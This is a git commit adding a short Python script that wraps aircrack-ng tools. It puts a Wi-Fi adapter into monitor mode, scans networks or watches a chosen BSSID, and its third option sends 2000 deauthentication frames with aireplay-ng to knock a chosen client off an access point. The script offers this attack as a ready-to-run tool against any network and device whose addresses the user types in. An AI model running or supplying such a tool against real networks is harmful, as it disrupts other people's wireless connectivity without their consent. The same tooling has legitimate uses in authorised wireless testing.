4224e74e471fa97964db85fece9809cb4ebff40a
coley15 <155040252+coley15@users.noreply.github.com>
2025-01-01 14:42:02 -0500

    First and only commit

---
+++ main.py
@@ -0,0 +1,66 @@
+import subprocess
+from time import sleep
+
+subprocess.run("iwconfig")
+
+adapter = input("Please enter your adapter name(e.g 'wlan0', 'wlan1'): ")
+
+
+print("Entering Monitor Mode...")
+sleep(1)
+
+commands = [
+    ["sudo", "systemctl", "stop", "NetworkManager"],
+    ["sudo", "systemctl", "stop", "wpa_supplicant"],
+    ["sudo", "ip", "link", "set", adapter, "down"],
+    ["sudo", "iw", "dev", adapter, "set", "type", "monitor"],
+    ["sudo", "ip", "link", "set", adapter, "up"]
+]
+
+for cmd in commands:
+	try:
+		subprocess.run(cmd, check=True)
+		print(f"✅ Command succeeded: {' '.join(cmd)}")
+
+	except Exception as e:
+		print(f"Command failed: {' '.join(cmd)}")
+
+
+print('\n')
+print("\n Monitor mode has been successfully enabled...\n")
+print('\n')
+sleep(0.5)
+
+choice = int(input("Please enter your choice | (1) Scan for 5GHz networks | (2) Scan a specific network | (3) Deauth a client | Please pick (1, 2 or 3): "))
+try:
+	if choice == 1:
+		subprocess.run(["sudo", "airodump-ng", "--band", "a", adapter])
+
+	elif choice == 2:
+		bssid = input("Please enter the BSSID MAC address: ")
+		channel = input("Please enter the channel of the MAC address: ")
+
+		subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, adapter])
+
+	elif choice == 3:
+		bssid = input("Please enter the BSSID MAC address: ")
+		target_addr = input("Pleas enter the targets MAC address: ")
+
+		subprocess.run(["sudo", "aireplay-ng", "--deauth", "2000", "-a", bssid, "-c", target_addr, adapter])
+
+except KeyboardInterrupt:
+	print("\n Detected Keyboard Interrupt, restoring network settings...")
+
+finally:
+	restore_network_commands = [
+		["sudo", "ip", "link", "set", adapter, "down"],
+    		["sudo", "iw", "dev", adapter, "set", "type", "managed"],
+    		["sudo", "ip", "link", "set", adapter, "up"],
+    		["sudo", "systemctl", "start", "wpa_supplicant"],
+    		["sudo", "systemctl", "start", "NetworkManager"]
+	]
+
+	for cmd in restore_network_commands:
+		subprocess.run(cmd)
+
+	print("Commands have been ran succesfully now closing...")
